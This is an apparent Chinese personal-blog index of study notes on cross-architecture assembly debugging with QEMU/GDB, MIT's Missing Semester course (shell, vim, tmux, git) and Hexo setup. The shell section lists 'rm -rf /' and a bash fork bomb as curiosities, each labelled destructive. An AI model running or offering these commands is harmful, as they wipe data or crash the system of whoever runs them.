&amp;&amp; kali virtual machine；CPU: AMD。 无法直接运行 arm 和 mips 架构的程序 arm可以使用手机终端 Termux 进行运行。或者购买云服务器? 环境安装 基本环境 user mode+kernel mode。 运行程序只需要一个qemu-user 就行，启动系统需要 qemu-system-xxx 甚至可以 qemu-system 跑kernel，然后跑程序😂12# qemu user用户态 system启动内核镜像sudo apt install qemu-user arm 环境 1234567# gun 编译工具链 + 动态链接库sudo apt list gcc* | grep armsudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu# optional: qemu arm system modesudo apt list &quot;qemu*&quot; # 寻找对用的archsudo apt install qemu-system-arm qemu-system-aarch64 mips 环境. 12345# gun 编译工具链sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64# optional: qemu mips system mode, 目前没见过， user mode 应该够了sudo apt install qemu-system-mips gdb 1sudo apt install gdb gdb-multiarch 测试 qemu-user 使用 -g gdb模式 确定gdb调试端口 qemu-system 使用 -s -S 或者 -gdb tcp:1234 gdbserver等待连接，默认端口 1234 编程测试 1234567#include &lt;stdio.h&gt;int main() { printf(&quot;hello, world!&quot;); getchar(); return 0;} 寻找动态链接库。lib-&gt;/usr/lib 的链接 1$ ls -al /usr/lib | grep arm # aarch64 mips... arm 测试，不知为什么，测试时 -g放前面才成功 1234567891011121314# 编译arm-linux-gnueabi-gcc hello.c -o helloarm -gaarch64-linux-gnu-gcc hello.c -o helloaarch -g# 运行$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm$ qemu-aarch64# 调试$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm $ gdb-multiarchgdb&gt; set arch arm # aarch64gdb&gt; target remote localhost:1234xxx mips 测试, 与arm类似 12$ mips-linux-gnu-gcc hello.c -o hellomips -g... x86 CISC x86 intel x86 通用寄存器 12345678910111213; 通用eax: 累加器ebx: 一般基址寄存器，baseecx: counter, 在loop时，默认计数edx: 一般用于存放dataesi: source index, 处理字符串常用edi: destinatin index, 处理字符串常用esp: stack pointer, 栈顶ebp: base pointer, 栈基址eip: 指向将要执行的指令。 标志位 eflags 12345678CF: carry flag, 进位ZF: zero, 0SF: sign, 符号OF: overflow, 溢出TF: trap, 跟踪IF: interrupt, 中断PF: parity, 奇偶... 段寄存器 123456cs: code segment 代码段ds: data 数据段ss: stack 堆栈段es: extend 扩展段fs: 数据段gs: 数据段 控制寄存器 12; 某些保护模式cr0-cr4 寻址 12movlea 算术指令 1234567891011121314151617181920; 基本运算addsubmuldivincdec; 逻辑运算cmpandorxornot; 移位操作shl ; shift leftshrsal ; shift arithmetic left 算数左移sar 跳转 1234; jmp 类jmpjb ; blowjg ; greater 函数调用 123call function; call 执行时，保存 eip+4, 并跳转到对应地址; 参数传递，使用栈传递参数 栈帧 1234567; 在调用子程序时，会开辟子程序的栈帧。esp和ebp保存栈顶和栈底; 在返回父程序需要还原esp, ebp指针。; 栈 低地址生长; sp自动变化push ebx ; sp-4pop rax ; sp+4 系统调用 12; 系统中断处理syscallint 0x80 ; eax系统调用号 ebx, ecx, edx对应函数前三个参数 x86-64 实际上x86-64与AMD64基本是同一个ISA，现在我们使用购买的Intel或者AMD生产的CPU，都属于x86-64的ISA。 x86-64: 64位，可寻址 2^64, 兼容x86 123456789101112; 32位 r-&gt;b比如 rax-&gt;eaxrax, rbx, rcx, rdxrsi, rdirsp, rbpr8: r8d 32位 寄存器，低32位r9: r9dr10: ...r11: ...r12: ...r13: ...r14: ...r15: ... 函数调用约定, 与x86相差较大 12345; 函数参数rdi, rsi, rdx, rcx, r8, r9 ; 传递前6个参数，第7个参数开始和x86一样使用栈传递; 返回值rax 系统调用 123; syscallrax: 系统调用号; 参数传递与函数一致， rdi, rsi... ARM RISC ARM指令格式 123456label op-code oprand1 oprand2 oprand3 ... @commit@ 更加学术 rd: destination; rn: 寄存器中用于算术运算的操作数; shifter_operand: 数据处理指令&lt;opcode&gt; {&lt;cond&gt;} {S} &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;@ 注释 `@`, `//` `/**/` `;` ARMv7 32位指令集A32，兼容16位指令集T16 由于ARMv7 兼容 ARM和 Thumb指令集，区分两个指令集： addr &amp; 1 == 1代表thumb指令集 ARMv7通用寄存器 1234567r0-r3: args, 函数前四个参数，返回值也会存入r0. r4-r10: r11: fp, frame pointerr12: ip, Intra-Procedure-call scratch register, 在新版本当作通用寄存器使用，会在bl时引发bugr13: sp, stack pointerr14: lr, link registerr15: pc, program count, 指向下一条需要执行的指令 标志位(CPSR: program status reg),如果想改变，需要在某些指令后加 s (sub -&gt; subs) 1234567N: negative, 运算结果&gt;=0 N=0, 负数，N=1Z: zero, 为0C: carry, 进位V: overflow 有溢出; cmp 可以改变cmp r0, r1 mov 立即数 12345mov r0, #1 @ r0 &lt;- 1@ 特殊寄存器 cpsr || spsrmrs r0, cpsr @ r0 &lt;- cpsrmsr cpsr, r1 @ cpsr &lt;- r1 访问内存 123456789@ 不能直接像intel mov访问内存, 使用 load, store命令间接访问内存ldr rd, [rn , #offset] @ load registerstr rd, [rn, #offset]ldm @ load multiplestm ; 例子ldr r0, =0X20000002 @ r0=0X20000002，加载地址到寄存器 str r1, [r0] @ r1 中的值写入到 r0 中所保存的地址中 算术指令 12345678910111213141516171819@ 基本算数运算add rd, rn, rm @ rd = rn + rmsub rd, rn, rm @ rd = rn - rmmul rd, rn, rm @ rd = rn * rmsdiv rd, rn, rm @ rd = rn / rm, s(ign)div u(nsign)div@ 想改变标志位, 加 's' =&gt; subs...@ 逻辑运算and rd, rn @ rd = rd &amp; rnand rd, rn, #imm @ rd = rn &amp; #immorr rd, rn @ rd = rd | rneor rd, rn @ rd = rd ^ rn@ 移位操作lsl @ logic shift left 逻辑左移lsr @ 逻辑右移asr @ arithmetic shift right 算数右移ror @ rotate right 循环右移 程序跳转 12345678910b: 直接跳到label。 branchbx: 跳转+状态切换 @ ARM/Thumb 模式(使用一次，切换一次)bl: b + link, 首先保存下一条指令地址到lr, 然后改变pc。blx: bl+bx@ 条件跳转, 状态寄存器eq: equal 相等ne: not eqlt: less le: less equal 函数调用 1@ 仍然是使用 `b` 指令调用函数 栈帧相关 1234567891011121314151617@ sp, fp 维护栈帧的状态, 栈向 低地址生长fp -&gt; +-------+ | frame |sp -&gt; +-------+@ push/pop 可以操作多个寄存器，甚至可以控制pc; sp自动变化@ 下面是常见的函数调用出现出现的gadget push {r0-r4, lr} @ 顺序是 push r12; push r4; push r3 ......pop {r0-r4, pc} @ 顺序是 pop r0; pop r1; ...@ 等价于 push, 先计算sp的值?stmfd sp!, {r0-r4, r12}@ 等价于 popldmfd sp!, lr 系统中断 123456789101112@ 通过vector_swi/svc 获得系统调用号swi #immsvc #imm@ O(old)ABI 形式mov r0, #34swi 12@ E(extended)ABI 形式，立即数 imm被忽略,由r0决定mov r0, #12mov r1, #34swi 0 ARMv8 与 armv7 存在一定的区别 64位指令集 aarch64, 兼容32位 aarch32 12aarch64: 64-bit registers and memory accesses, new instruction set；aarch32: backwards compatible with ARMv7-A ARMv8 通用寄存器 123456789101112131415x0-x31x0-x7: 函数前8个参数值x8: 函数返回值x19-x28: 没特殊用途 x29: fp frame pointerx30: lrx31: zr, zero register, 恒0x32: pc, 不能像armv7一样被修改@ 也可使用32位的 w0...寄存器, 可扩展使用@ sp对应的物理寄存器有如下四个(某一时刻只能对应下面其中一个)SP_EL0和SP_EL1SP_EL2SP_EL3 SPSR 替代了 CPSR 内存访问 1234@ load &amp; store, 兼容armv7 ldrldp @ load pair 一对。 ldp x8, x2, [x0, #0x10] @ 将x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)stp @ store pair 函数 12345@ 参数传递x0-x7: 函数前8个参数值x8: 函数返回值@ aarch64没有push和pop 指令 系统调用 12@ supervisor callsvc #imm TrustZone 相关xxx ARMv9xxx Mips RISC， Microprocessor without Interlocked Pipeline Stages mips 是big-endian, mipsel是 little-endian 格式 123456789# 根据位数31-26 25-21 20-16 15-11 10-6 5-0op-code rs rt rd shamt func# 注释使用 `#`rd: register destinationrt: targetrs: source 通用寄存器， 32个 12345678910111213141516$0-$31 # 有各自的助记符，看汇编时多使用助记符$0: $zero # 恒01: $at # 2-3: $v0-v1 # value 函数返回值4-7: $a0-a3 # arg 函数参数8-15: $t0-t7 # temp16-23: $s0-s7 # save 保留24-25: $t8-t9 # temp16-27: $k0-k1 # 异常或中断28: $gp # global pointer29: $sp # stack pointer30: $fp, s8 # frame pointer 31: $ra # ret addr; 特殊pc: program cunter 指令格式 123r: register format # 使用寄存器i: immediate # 使用立即数j: jump 寻址 1move $a0, $zero # a0&lt;-0 访问内存 12345678910# 仍然 load, store# b: byte; w: word; h: half word; ...sw: sw $ra, 0x38($sp) # 将$ra存入栈中 $sp+38的地方sb: ...lw: ...lb: ...# 例子sb r1, 0(R2)lb r1, 0(r2) 算术 123456789101112; 基本算术addsub; 逻辑orxornor; 移位sllsrl 跳转 12345678910; jmpj: jmp labeljr: 用法 jr $ra 等jal: jmp and link, 保存 ret addr(pc+4) 到 $rajalr: 借用寄存器跳转，链接，常用; branch, 后面需要跟操作beq: beq $s, $t, offset # $s=$t跳转bne: b not eqbltz: branch less than zero 架构缓存 有两个独立的cache: 指令 和 数据 RISC-Vxxx","link":"/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"},{"title":"计算机教育缺失的一课","text":"The Missing Semester of your CS education，共11节课，每节课约1h。 bilibili 双语字幕 Missing Semester IAP 2020 确实不错，手敲命令+讲解。多使用Linux 学校应该在大一教这个，而不是TM的大学物理 课程网站 1https://missing.csail.mit.edu/ lectrue1: overview &amp; shell 主要是 Linux 基本命令 overview 如何利用存在的工具使我们开发更加高效，以及如何更好的利用我们的计算机，这是这门课主要解决的问题。 shell 讲述了Linux Shell.主要是bash 1shell是运行在终端中的文本互动程序，bash（GNU Bourne-Again Shell）是最常用的一种shell。是当前大多数Linux发行版的默认Shell。 日期 1$ date 打印 1$ echo &quot;hello world&quot; 路径列表 123# 当我们执行一些命令时，会遍历PATH寻找；比如说使用 /bin/echo 时只需在终端输入 echo 就行# `:` 分隔$ echo $PATH 寻找命令的路径 123456$ which echo/usr/bin/echo# whereis可以寻找到 原始代码、二进制文件，或是帮助文件$ whereis bashbash: /usr/bin/bash /usr/share/man/man1/bash.1.gz 目录 12345678910111213141516171819202122# change dir$ cd /home/username# `..` 代表上一级目录。`.` 代表当前目录 $ cd ..# `-` 当前目录和之前目录下切换$ cd /mnt$ cd /home$ cd -/mnt$ cd -/home$ cd -/mnt$ pwd/home/# 有趣的一点是，`..`使用过多的情况。`/`目录没有上一级，最高只能到 `/`$ ../../../../../../bin/datexxx 文件操作 1234567891011121314151617181920212223242526272829303132333435363738394041# list: 列出指定目录下所有的文件，默认当前目录$ ls test.txt$ ls /lib root home ...# 移动文件位置 move$ mov test.txt /tmp$ ls /tmptest.txt# 重命名$ cd /tmp$ mov test.txt tmp.txt$ ls tmp.txt# 复制 copy$ cp tmp.txt tmp1.txt# 删除$ rm tmp1.txt# 创建一个文件$ touch tmp2.txt# 创建文件夹$ mkdir tmpdir$ rmdir # rm -r 也行# 查看文件所有内容$ cat test.txthello world# 查看文件开头结尾，默认10行$ head test.txt$ tail test.txt# cat 重定向$ cat test.txt &gt; tmp.txt # 如果没有就创建tmp.txt.$ cat &lt; text.txt &gt; tmp.txt # 同上$ cat test.txt &gt;&gt; tmp.txt # &gt; 会清除原先内容。&gt;&gt; 代表append，追加而不清除 命令参数和帮助文档 123456789# 一般命令也存在参数，一般为 -?$ ls -l /home# d: dir rwx: 权限Read, Write, eXecute(也代表是否能够访问此目录)。# 从前到后: owner权限 group权限 其余用户权限 owner group size date dir_namedrwxr-x--- 27 user user 4096 Jun 21 14:42 user # 查帮助文档，q退出。manual pages$ man ls -l use a long listing format 管道：左侧的输出作为右侧的输入 1234$ ls / | tail -n 1 # -n 1 最后一行# 有时候给root权限文件写入时，比如sudo echo 123 &gt; tmp.txt会报错，可用以下命令$ echo 123 | sudo tee tmp.txt root user: 超级管理员。尽量少用，在运行错误的程序时会破坏计算机。 123456# 用户使用root权限$ sudo &lt;commond&gt;$ sudo supassword: xxxroot# `#` 代表root 权限 /sys 文件夹：各种内核参数，显示设备的状态。linux系统将其视为文件暴漏给用户，意味着我们可以操作从而控制某些设备 有趣的命令 123456789101112131415161718192021222324252627282930313233343536373839# 删库跑路，无需确认强制删除所有的文件$ rm -rf /# fork 炸弹, 会耗尽电脑资源$ :(){ :|:&amp; };: # 理解为一个函数递归调用 `:` 为函数名:() { : | :&amp;};:# 由于ls打错频率比较高，会出现一个动画(火车)sl# cowsay 打印一段话 cowthink 类似，但是thinkcowsay &quot;nb&quot; -l 查看动物，需要安装 -f 指定动物 ____&lt; nb &gt; ---- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || ||# figlet 字符字 toilet类似 figlet love &quot;&quot;# # mmm m m mmm # #&quot; &quot;# &quot;m m&quot; #&quot; # # # # #m# #&quot;&quot;&quot;&quot; &quot;mm &quot;#m#&quot; # &quot;#mm&quot;# 打印一堆信息和logo，装b使用neofetch 现代化的命令：开发者使用rust写了很多更加现代的命令，可以替代一些老命令 12exa =&gt; lsbat =&gt; cat Q&amp;A shell, console, terminal?1xxx lectrue2: shell script Linux 脚本的使用 语法 123456789101112131415$0 运行文件名$1-$9 参数$? 获取上一个运行的错误 0代表正确，1代表出错$_ 存储上次运行的结果$# 参数个数$$ 进程id$@ 所有的参数组成，可迭代!! 在执行时会替换为上一个执行的命令# 变量foo=barecho &quot;$foo&quot;# 变量赋值为命令的结果foo=$(pwd) 循环 1for xxx; do... done 条件 1if xxx; then...fi 编程脚本 123# 加入magic line 指定解析器# 一个 称之为 `shebang` 的东西#!/usr/bin/pyton3 man 命令的其余选择 tldr ，更加简洁(too long; don’t read) 1tldr tar 递归查询 1234567891011121314find . # . 代表当前路径，我们可以指定比如 `/` -name # 名称,可以使用通配符 -type # 类型 d(dir) f(file) -mtime -1 # 修改时间modify time， 1指1天 -exec rm {} \\; # 对于寻找的文件执行命令 \\; 不可缺少fd # 更加现代化的findlocate # 默认查找整个计算机grep # 应用于查文件内容 -R # 递归rg # ripgrep 查找使用过的命令 12345方向键的上fzfzsh 的一个插件，在输入时会显示曾经输入的类似命令 更清晰的目录结构 12treebroot lecture3: editor VIM normal mode: 可以控制光标，执行命令… insert mode: 就是文本编辑器。 command mode: 在insert mode 输入 : 在输入命令 visual mode: 有点像使用鼠标选中一块连续区域 replace mode 进入 insert mode 123456i insert， 在光标前插入a append，在光标后I 行首A 行尾o 下一行 open a new lineO 上一行 normal mode 1esc 也可以自行配置 保存，退出 1234-- write quitnormal mode 下 :wq-- 加入 ! 代表强制执行 normal mode 光标操作。 所有的都可以在前面加一个数字，代表count123456789101112131415161718h 左移j 下k 上l 右w 向前(后一个单词)移动一个 word, 也就是一个单词，标点或者空格分开。在单词第一个字母b 向back移动 word back of worde 移动到单词末尾 end of word0 移动到行首$ 行尾^ 一行第一个非空字符ctrl-u up类似鼠标向上滚动ctrl-d down 向下H highest 屏幕第一行L low 屏幕最后一行M mid 屏幕中间一行 删除 123456789101112131415d 删除一个字符,配合移动光标使用 dd 删除一行，可以使用p D 删除至末尾 d1G 删除到第一行 dG 删除到最后一行 n1, n2d 删除n1-n2行 -- 在这里 a around; i inside di( 删除括号内的内容 da( 删除包括括号的东西c change a word 删除(d 类似)并进入insert mode x 删除后面一个字符 &lt;num&gt;x 删除后面num个字符s 删除字符进入insert modeS 删除一行进入insert mode 复制粘贴 12345y yank yy 复制当前行 y1G ...p paste在这一行后面P 这一行前面 跳转到某一行 12345g gg 第一行G 最后一行 &lt;num&gt;G 跳转到num行:&lt;num&gt; 跳到第num行 撤销之前的操作 12u undoctrl + r redo 恢复撤销的内容 visual mode: 允许我们改变一列，整块复制等 123v 字符可视，开始和结束两个字符中间所有内容，退出按vV 行可视行，光标所在行，退出 Vctrl+v 块可视，开始和结束光标的矩阵，退出ctrl+v 搜索 1234f&lt;word&gt; 本行查找/&lt;word&gt; 查内容,全文n 继续向下继续找 nextN 继续向上找 更改环境 1:set nu 显示行号 ~ 反转大小写 括号匹配 1% 到匹配的另一个括号处 tab, window, buffer 12345tab: 我理解为 在系统中打开vim这个软件两次，就是两个tabwindow: vim 屏幕，可以分屏buffer: 打开文件，文件具有buffer, 同一个文件同一个buffer,实时。 配置，vim 在执行前会加载一个 ~/.vimrc 文件。 我们可以DIY自己的喜欢的按键。 安装插件实现更多的功能 neovim 本人使用 neovim 配合 LazyVim。可DIY. 然后再 VsCode 安装neovim插件，同步使用。 常用的操作，neovim也能用。 keymap Leader 为 space 键，挺好用, 使用这些功能也需要安装对应插件 打开终端 1234&lt;leader&gt;ft 当前&lt;leader&gt;fT /ctrl-/ 打开和关闭 快速注释 1&lt;leader&gt;gc 但是需要指定的 LSP 不同文件间(buffer)切换 1&lt;leader&gt;bb 文件搜索 telescope 12345-- 文件名&lt;leader&gt;&lt;leader&gt; &lt;esc&gt;&lt;esc&gt; 退出-- 文件内容&lt;leader&gt;sb 文件内 12&lt;c-s&gt; 保存文件&lt;leader&gt;fn new file 分屏 12345678&lt;leader&gt;w| &lt;leader&gt;| 生动表示竖着&lt;leader&gt;w- &lt;leader&gt;- 横着-- 切换，和normal mode 下的移动联系&lt;C-h&gt; 左&lt;C-j&gt; 下&lt;C-k&gt; 上&lt;C-l&gt; 右 侧边栏 neo-tree 123456789&lt;leader&gt;fe 当前&lt;leader&gt;fE /&lt;leader&gt;e 当前&lt;leader&gt;E /-- 侧边栏进入文件后，在进入侧边栏&lt;C-h&gt; &lt;C-l&gt; lazy.nvim 插件管理非常受欢迎。作者开发的插件和配置。 lecture4: data wrangling 处理数据的某些手段 grep，搜索 12grep &quot;word&quot; tmp.txt # 查询 -R # 递归，可以查找文件夹下的文件 sed，在搜索替换是一个好用的工具。需要学习一下正则表达式 12345sed 's/&lt;pattern&gt;/&lt;replace&gt;/'pattern: 匹配模式，支持正则表达式replace: 将匹配到的pattern 转换为 replace。当捕获时 \\num 代表第num个捕获，打印# sed 默认支持很老的正则表达式，使用 `-E` 参数，支持现代化的正则 一些正则表达式使用，使用在线网站练习。regular expression 123456[0-9] 0,1,2...9 其中一个数字* 贪婪模式，1次或多次? 0 或 1 次. 任意字符() 捕获括号内的内容^ 开头 $ 末尾 wc 1wc -l word count,统计大小 -l line 几行 排序，字典序。去重 12345sort 默认字典序排序 -n 按照数值的大小进行排序 -k 指定排序的列数uniq 可去除重复内容 -c 记录出现次数 awk，基于流的处理，是一门编程语言 1234awk 'script' 执行一个脚本awk '{print $0}' -F 指定分隔符 cut，类似编程语言的split 1234567cut [option] filename -d 字节为单位分割 cut -d 3 第三个字符 -d 3-9,12 第3-9,12个字符 -f fields 与-d一起使用，表示区域 cut -d : -f2 第1-2个冒号之前的内容 -c character 字符为单位，处理中文好用 -b 编程语言在命令行的使用? 各种管道，图片音频处理? lecture5: command-line environment 优雅的使用命令行 job control Linux 系统的 signal机制 1234man signal : 会看到不同的number 和 namectrl-c SIGINT signal interruptctrl-\\ SIGQUIT ctrl+z 12345# 暂停，可执行其他任务&amp; 在命令后加入，表示后台执行jobs 查看后台任务，暂停或者运行 pidfg %num / bg %num 使暂停的任务继续运行，fg 恢复到前台。bg 恢复到后台执行。front back groundkill %num 停止 terminal multiplexers 终端复用，在一个terminal window干很多事情。 很多的终端都存在分屏等操作，但是课程介绍神器 tmux，更加神奇。 不 kill session，其中的命令会一直执行下去。只需要开启一次终端。 在ssh 服务器时非常的好用 session, window, pune 启动tmux, 会开启一个session, 明显的是下面会出现一行数据。 window 创建一个新的shell 终端。 pune 面板，一个窗口可以分很多的面板。 命令行操作 123456789101112tmux 下部会出现状态栏，分别是session window1 windiow2... 时间等tmux a # attach 进入session -t name 指定名称tmux new -t &lt;name&gt; 创建并指定名称tmux kill-session -t &lt;num/name&gt; 杀死指定的sessiontmux ls 查看所有的sessiontmux splitw -h/-v pane 横竖分割window 默认快捷键。可以先按一下 ctrl-b 在按其余的，不需要同时按。 1234567891011121314151617181920212223prefix = Ctrl-b# session prefix keymapprefix d dettach sessionprefix s 列出所有session vim快捷键下的选择# windowprefix c create a new windowprefix p previous windowprefix n next windowprefix &lt;n&gt; 第n个窗口,n是个数字prefix w 列出window 和 session(s ?), jk 选择，enter进入prefix , 重命名# puneprefix x 关闭puneprefix % 竖直切割prefix &quot; 水平切割prefix 方向键 选择 puneprefix x 关闭puneprefix z 最大化当前窗口，在按一次退出prefix ! 分离pune 进入window持续按prefix 方向键 改变pune大小 配置快捷键， ~/.tmux.conf。我使用的是基于网上找的 tmux-conf。 123456ctrl-b 距离非常有点阴间，因此需要改。ctrl-a 是qemu快捷键。因此选择ctrl-xprefix I install pluginsprefix alt I uninstallalt + 方向键，pune 移动 插件管理 Tmux Plugin Manager 美化+快捷键 系列操作参考。awesome-tmux: A list of awesome resources for tmux aliases 给常用的命令设置别名 bash 的~/.bashrc 文件1234# 注意，不要存在 ll = 'ls -l' 因为在shell script中，空格是有意义的alias ll='ls -alF'alias la='ls -A'alias l='ls -CF' dotfiles 各种配置文件。大部分是文件 bash -&gt; ~/.bashrc zsh -&gt; ~/.zshrc。我们的zsh美化也是修改此文件。 vim -&gt; ~/.vimrc tmux -&gt; ~/tmux.conf neovim -&gt; ~/.config/nvim 目录下的 基于lua 配置 ssh -&gt; ~/.ssh 这是一个目录。可以配置公私钥，免密登录。 自己的机器 ssh-keygen 命令生成公私钥 将公钥放入服务器的 authorized_keys。权限一般是6001234ssh-copy-id -i ~/.ssh/id_rsa.pub &lt;username&gt;@&lt;IP&gt;# 常用的ssh 传输文件 scp 和cp命令差不多，给出路径scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp 感兴趣的可以学习一下 NixOS, 一个基于配置文件的操作系统😋 大部分配置都可在 github 查找到，如果不想自己配置，直接 clone/fork 一个其他人的。 bash 前面的一串的修改 1PS1=&quot;user&gt;&quot; 我们shell 前面的一串 问题：如何在本机和服务器同时使用tmux 相同的配置会可能产生冲突，或者会使我们不知道操作的是哪一个，因此我们需要不同的配置文件。最简单的就是使用两个 prefix 。 lecture6: virsion control(git) git版本控制 开发项目，团队合作，文件损坏的回退。。。git都可以在很大程度上帮助我们，不需要删除在重新下载😘 git 抽象建模。使用有向无环图进行抽象 顶层root，文件夹抽象为tree, 文件抽象为blob commit: 每次commit 产生一个类似 snapshot(快照)的东西，保存当前的状态以及一些信息(作者，描述…)。 通过 mapping&lt;string, object&gt; 进行管理.string指文件的哈希值(SHA-1)，object是我们文件保存的地址(‘snapshot’在磁盘中的地址)。每次修改，commit会产生新的hash reference: git需要的是文件的哈希值，对于人类毫无意义，因此存在另一个 mapping&lt;string, string&gt; 。我们使用可以人类方便阅读的字符串，映射到hash，然后在寻找到文件 git 几个状态，可以看看 Git工作流和核心原理，非常有趣。在学习时，可以想象一下有向无环图进行理解。 工作区 暂存区 本地仓库 远程仓库 git 的配置 123# 配置用户名，邮箱。自己的账户。git config --global user.name &quot;your name&quot;git config --global user.email &quot;your email&quot; 创建一个git仓库 123456mkdir democd demogit init # 本地仓库初始化，出现一个 `.git` 的目录git status # 查看仓库状态，非常常用 日志，查看提交的文件 12# oneline 去除一定的信息git log --all --graph --decorate --oneline 其中存在一个 HEAD 指针指向当前工作的分支。 我们想忽略某些文件时 1234# 使用 gitignore 文件配置touch .gitignore*.jpg # 忽略所有的 jpg文件 本地操作 12345678910git init# 写点新文件echo &quot;hello&quot; &gt; readme.md # 处于untracked 状态，使用git status 会存在提示# 暂存区git add readme.txt # 处于tracked 状态# 提交到本地仓库git commit # 进入文件，进行描述修改的内容 -m &quot;message&quot; # message 代表描述，简短描述可以这样使用 提交到远程代码仓库 123456789101112131415161718192021# 1. 远程创建后直接clone下来，然后再写内容git clone &quot;your-repo&quot;git remote -v # 查看和那些仓库有联系git push # 有.git文件夹，可以找到仓库提交# 2. 我们在本地写了很多文件，但是中途想起来没有使用git，我们如何做？## 还是需要先创建仓库## 然后再本地git initgit add .git commitgit remote add &quot;name&quot; git@&lt;your-repo&gt; # 关联远程仓库。 # name 自己取，可以关联很多仓库，根据名字区分## 但是本地仓库一般是master，某些平台是main(也可以选，但是默认是main)，这一步可能出错，需要切换分支 `git checkout -b main`## 远程分支不存在会创建一个git push &quot;仓库名称&quot; &quot;本地分支名&quot;:&quot;远程分支名&quot; # 如果本地分支名与远程分支名相同，则可以省略冒号## 删除远程仓库git remote rm &quot;仓库名&quot; 从远程仓库到工作区。比如团队合作中，远程仓库更新了，我们需要先同步。 1234567891011# 直接同步到本地，会直接更新本地文件git pull# 由于pull 一步到位，也可分步进行## 先更新到到本地仓库git fetch## diff 对比区别git diff # 查看本地仓库和工作区的区别## pull 合并 = git fetch + git mergegit pull 分支操作。我们参与开源项目时，建议创建一个新分支push，由项目负责人决定是否合并(merge)。 12345678910git branch &quot;name&quot; # 创建一个分支 -vv # 查看分支信息git checkout &quot;name&quot; # 切换分支 -d &quot;name&quot; # 删除分支 -D &quot;name&quot; # 暴力删除 -b &quot;name&quot; # 创建一个分支然后切换git merge # 将别的分支合并到 `当前分支` 中 # 可能会存在冲突，在某一个相同的位置存在不同的内容.保存的话，自己决定然后修改冲突文件就行 git clone 会复制远程的所有文件，包含其所有的 snapshot 我们可以使用 --shallow 忽略这些 git 回滚：当我们在一个分支中commit后发现一个巨大的错误，需要回退到之前的版本。改变 HEAD 指针 123456789101112git stash # 回退到上一个commit 版本git bisect # 比较强大的工具git reset --hard # 会丢失最新的代码修改 --soft # 将 HEAD 指针回退到指定提交，不改变暂存区和工作区的内容 HEAD^ # 上一个 版本 HEAD~&lt;num&gt; # 回退num个版本 &lt;hash&gt; # 回退到指定哈希值的版本git revert -n hash # 将版本复制一份，不会销毁 现在的IDE中存在git相关的工具，也更加方便了我们的使用。 也存在其余的版本控制工具，svn, repo…… repo 使用 repo 更适合多个仓库的管理，平常我们见的项目都是一个仓库。但是向Android这样的依赖上百个git仓库来说，依靠git并不是多么好使用，因此google 开发了repo工具，本质是一个python脚本，基于git。 初始化 1234repo init -u git@&lt;repo&gt;/mainfest.git # 默认为google的仓库 https://gerrit.googlesource.com/git-repo # 这个目录下最简单只需要 default.xml -b # 指定branch -u后的仓库, xml文件(默认default.xml, 我们可以自己选择)，然后我们拉取的时候会将所有的git仓库拉取下来 12repo init -u &lt;repo&gt; -m 指定xml文件 拉取代码到本地 1repo sync -c 分支 123repo branch # 查看分支repo start &lt;branch_name&gt; --all # 创建分支并进入 lecture7: debugging &amp; profiling 调试程序以及性能分析 查看日志，打印日志，制作日志 调试器 GNU gdb，可以调试几乎所有的二进制程序 python pdb，python调试 浏览器调试js 性能测试 测试一个程序运行 time lecture8: metaprogramming 如何更高的管理项目、测试、依赖管理。使用 makefile makefile 的使用比较简单。 12345目标: 依赖 命令 //前面必须是tab键main: main.c gcc main.c -o mian 一些语法 123456$^ 所有的依赖项$&lt; 一个依赖项$@ 目标文件echo 打印% 通配符* 也是通配符 我们编译某些开源项目时也会使用 make 命令，可以看看别人怎么写的。 当然，还有其他的选择，比如 cmake lecture9: security &amp; crypto 安全很多，也是一门专门的学科，想要深入就需要学专业课 hash: 用作信息摘要，签名，检查文件的完整性。 md5 sha-1/2/3 对称加密 DES AES 非对称加密 RSA ECC 数字签名 lecture10: potpourri 大杂烩：讲述一些概念，熟练还得在以后多练习 键盘映射 键盘上的Caps Lock几乎不怎么使用，我们可以重新配置一下(比如比较小的Esc)，让其发挥作用 守护进程，daemon APIs 比如说部分天气的API，我们只需要请求特定的URL带着正确的参数，我们就可以获得返回结果。 命令行参数 我们使用的命令可以带有参数 Window Manage VPN Jupyter Notebook: 交互式编程 GitHub: 代码托管平台 创建自己的仓库 提issue，解决问题 pr: pull request，自己写的提交给作者 merge 别人的请求 lecture11: Q&amp;A 来自学生的问题 如何进行操作系统的学习？ learn by exercise: 学习比较出名的 OS 课程，完成相应的lab，实现自己的OS …… 自己看看就行","link":"/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/"},{"title":"init-blog","text":"搭建博客环境 github + hexo hexo使用 hexo 命令报错，上网查，使用 npx hexo 插件下载 1npm install --save hexo-deployer-git 常用命令 12345678npx hexo init # 初始化一个仓库npx hexo cleannpx hexo g # 静态界面生成npx hexo s # 本地启动 servicenpx hexo d # 插件。传到githubnpx hexo new page &lt;name&gt; # 生成目录npx hexo new &lt;name&gt;.md #生成文章 常用属性 123456title: 标题， 使用 {{title}}date: 日期, 使用 {{date}}updated: 更新tags: 标签categories: 分类comments: 开启评论 true 本地 obsidian 写md vscode 更换主题 简约的主题 https://hexo.io/themes/index.html 网站 个人喜欢如下的主题 freemind.bithack next cactus icarus icarus theme 配置 最终选择了这个 安装 123npm install -S hexo-theme-icarus hexo-renderer-infernoorgit clone https://github.com/ppoffice/hexo-theme-icarus.git themes/icarus 更改 1hexo config theme icarus 配置: google + 官方文档，配置自己喜欢的地方 插件 评论区？ 持续学习 简单点也还行，不想折腾了。 官网 + google，满足一切要求 中文文档","link":"/2023/03/19/init-blog/"}],"tags":[{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"kernel 